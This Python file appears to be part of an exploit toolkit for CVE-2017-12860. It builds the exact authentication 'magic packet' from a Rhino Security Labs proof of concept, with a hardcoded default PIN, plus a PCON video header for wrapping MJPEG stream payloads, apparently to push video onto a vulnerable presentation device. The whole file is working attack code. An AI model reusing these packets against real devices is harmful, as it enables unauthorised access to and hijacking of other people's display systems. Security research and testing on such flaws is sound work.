import socket
import struct

def get_hex_ip(ip: str) -> str:
    return socket.inet_aton(ip).hex()

def get_hex_ip_reversed(ip: str) -> str:
    return socket.inet_aton(ip)[::-1].hex()

def get_auth_payload(pin: str = "2270") -> bytes:
    """
    Constructs the exact EEMP packet used by the Rhino Security Labs CVE-2017-12860 exploit.
    """
    import binascii
    pin_hex = binascii.hexlify(pin.encode('ascii')).decode()
    
    # 96-byte magic packet string from Rhino Security Labs PoC
    packet_hex = (
        "45454d5030313030455bc678040000004a00000001000000001c00000000000000"
        "ffffff00455bc6640201030005200320200001ff00ff00ff00000810000000010c"
        "00000026ab9ffbdf" + pin_hex + "000000000000000000000000ac15c508"
    )
    return binascii.unhexlify(packet_hex)

def get_pcon_video_header(x_offset: int, y_offset: int, width: int, height: int, payload_length: int) -> bytes:
    """
    Constructs the PCON Video Header to wrap MJPEG stream payloads.
    Total length: 16 bytes.
    """
    magic = b"PCON"
    # Network byte order (Big-Endian) required for PCON
    return struct.pack('>4sHHHHI', magic, x_offset, y_offset, width, height, payload_length)
